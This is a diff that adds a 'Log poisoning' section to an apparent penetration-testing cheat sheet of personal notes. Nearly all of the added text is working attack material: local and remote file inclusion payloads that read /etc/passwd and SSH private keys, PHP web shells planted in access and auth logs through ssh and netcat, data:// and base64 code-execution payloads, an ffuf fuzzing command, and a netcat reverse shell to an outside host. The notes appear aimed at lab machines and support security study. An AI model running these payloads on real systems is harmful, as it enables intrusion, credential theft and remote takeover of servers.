@@ -187,6 +187,74 @@ Password bypass
 ' or 1=1--+
 ```
 
+### Log poisoning
+Desmonds notes
+```
+#POC LFI, check /etc/passwd
+http://IP/?FI=/etc/passwd
+#or
+http://IP/?FI=../../../../../../../../etc/passwd
+#if there is any user has shell login
+http://IP/?FI=/home/user/.ssh/id_rsa
+# more advanced filter see https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
+# RFI, rare since it is not enabled by default
+# Setup a http server contains a reverse shell script
+# send request then it will be invoked
+http://IP/?FI=http://YOUR_IP/YOUR_PAYLOAD
+# access log poisoning with ssh
+ssh '<?php system($_GET['cmd']); ?>'@IP 
+# access log poisoning with http
+nc -nv IP HTTP_PORT
+<?php system($_GET['cmd']); ?> #<- then click on return key twice and you should see a bad request respond
+# SMTP injection
+http://IP/FI?=/var/mail/TARGET_USER&cmd=id
+# extension append filter
+# data, can execute code directly
+http://IP/FI?=data://text/plain,<?php phpinfo(); ?>
+http://IP/FI?=data://text/plain,<?php shell_exec("PAYLOAD"); ?>
+# data and base64 encode to code execution
+echo -n '<?php echo system($_GET["cmd"]);?>' | base64
+PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
+http://IP/FI?=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls
+# base64, can check file source
+http://IP/FI?=php://filter/convert.base64-encode/resource=FILE
+```
+IF LFI enabled above will work
+LFI tutorial: 
+https://systemweakness.com/log-poisoning-to-remote-code-execution-lfi-curl-7c49be11956
+
+IF NO LFI
+```
+To send packets to the authenticated /logViewPage.php first need to grab the PHPSESSIONID
+Inspect Page and storage tab -> PHPSESSION ID: 3igpv4q3neckiknb40ou3hrt8o
+
+Use ffuf to fuzz the page using these lists -> /usr/share/seclists/Fuzzing/LFI
+
+ffuf -b 'PHPSESSID=3igpv4q3neckiknb40ou3hrt8o' -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://192.168.1.136/sea.php\?file\=../../../../FUZZ -fw 56
+
+the ../../../../ can be run with different deepness for different files up to 10
+
+passing the final path to burp repeater
+http://192.168.56.113/sea.php?file=../../../../var/log/auth
+
+Look for logs with SSH logins or another other logins that are being logged
+ssh hello@@192.168.1.136 to check if it logs
+
+Replace the username (hello) with a php shell and try to login it will get into the log file and when we load the log file through our sea.php if the system() function for php is available it will process the php code that loaded from logs
+
+ssh '<?php system($_GET['cmd']); ?>'@192.168.1.136
+
+On burp suite : /sea.php?file=../../../../var/log/auth&cmd=ls
+If the remote code worked then you can inject a reverse shell
+
+/usr/bin/nc 192.168.1.106 4848 -e /bin/sh
+/sea.php?file=../../../../var/log/auth&cmd=/usr/bin/nc+192.168.1.106+4848+-e+/bin/sh
+
+```
+
+
+
+
 
 
 
